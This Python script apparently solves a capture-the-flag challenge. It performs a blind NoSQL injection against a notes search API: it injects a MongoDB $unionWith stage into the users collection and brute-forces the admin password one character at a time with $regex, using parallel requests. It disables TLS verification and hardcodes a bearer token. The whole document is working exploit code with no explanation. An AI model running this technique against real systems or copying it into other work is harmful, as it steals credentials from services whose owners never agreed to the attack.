
import requests
import urllib3
import string
import concurrent.futures

urllib3.disable_warnings()

# Config
username = "admin"
password = "CBC{"
u = "https://bulbel.cbc2025.cloud/api/notes/search"
headers = {
    'content-type': 'application/json',
    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2OGJiMThmOWQ1MzFmNmU2OGEzZTg1NTciLCJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzU3MDkyMDg5LCJleHAiOjE3NTc2OTY4ODl9.u2J9bMhgMQrcrxKpGKGGa19fSQ-8IOOQN3ojPmbEkN4'
}

# Characters to try (filter out regex metacharacters that will break payload)
charset = [c for c in string.hexdigits + "}" if c not in ['*','+','.','?','|','"']]

def try_char(c, prefix):
    """Send one request to test prefix+c"""
    payload = f'''{{
        "query": [
          {{
            "$match": {{"title": null}}
          }},
          {{
            "$unionWith": {{
              "coll": "users",
              "pipeline": [
                {{
                  "$match": {{
                    "username": "{username}",
                    "password": {{"$regex": "^{prefix}{c}"}}
                  }}
                }}
              ]
            }}
          }}
        ]
    }}'''
    r = requests.post(u, data=payload, headers=headers, timeout=100, verify=False, allow_redirects=False)
    if "true" in r.text:
        return c
    return None

while True:
    found = None
    # Try all chars in parallel for the next position
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        futures = [executor.submit(try_char, c, password) for c in charset]
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                found = result
                break   # stop as soon as one char matches

    if found:
        password += found
        print(f"[+] Found char: {found} -> {password}")
    else:
        print("[!] No more matches, stopping.")
        break
